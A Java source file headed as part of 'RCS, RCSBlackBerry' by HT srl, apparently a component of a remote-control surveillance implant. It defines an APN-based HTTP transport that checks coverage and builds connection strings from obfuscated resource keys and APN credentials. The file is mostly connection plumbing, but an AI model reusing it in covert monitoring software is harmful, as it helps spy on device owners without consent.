//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import net.rim.device.api.system.CoverageInfo;
import net.rim.device.api.system.RadioInfo;
import blackberry.Messages;
import blackberry.action.Apn;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class ApnTransport extends HttpTransport {

    Apn apn = null;

    //#ifdef DEBUG
    private static Debug debug = new Debug("ApnTransport", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    public ApnTransport(String host, Apn apn) {
        super(host);

        this.apn = apn;
    }

    //#ifdef DEBUG
    public String toString() {
        return "ApnTransport " + host + " ( " + apn + ")"; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
    }
   //#endif

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable"); //$NON-NLS-1$
        //#endif
        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        boolean coverage = CoverageInfo
                .isCoverageSufficient(CoverageInfo.COVERAGE_DIRECT);

        //#ifdef DEBUG
        debug.trace("isAvailable apn: " + gprs + " & " + coverage); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        return coverage & gprs & apn != null && apn.isValid();
    }

    protected String getSuffix() {

        return Messages.getString("j.0") + apn.apn + Messages.getString("j.8") //$NON-NLS-1$ //$NON-NLS-2$
                + apn.user + Messages.getString("j.9") + apn.pass; //$NON-NLS-1$

    }
}
